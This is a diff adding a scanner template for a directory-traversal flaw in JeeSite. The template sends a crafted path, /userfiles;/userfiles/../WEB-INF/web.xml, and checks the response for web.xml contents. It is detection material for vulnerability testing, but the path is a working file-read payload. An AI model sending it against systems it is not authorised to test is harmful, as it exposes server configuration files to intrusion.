@@ -1,0 +1,25 @@
+id: yaml-poc-jeesite-jeesite-directory_traversal-CT-515866
+info:
+  name: Yaml Poc Jeesite Jeesite Directory_Traversal Ct 515866
+  author: converted
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-jeesite-jeesite-directory_traversal-CT-515866'
+  tags: traversal
+  reference:
+  - http://www.yulegeyu.com/2021/06/19/JEESITE-V1-2-7-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/
+http:
+- method: GET
+  path:
+  - /userfiles;/userfiles/../WEB-INF/web.xml
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - <display-name>
+    - thinkgem.jeesite
+    - <listener-class>
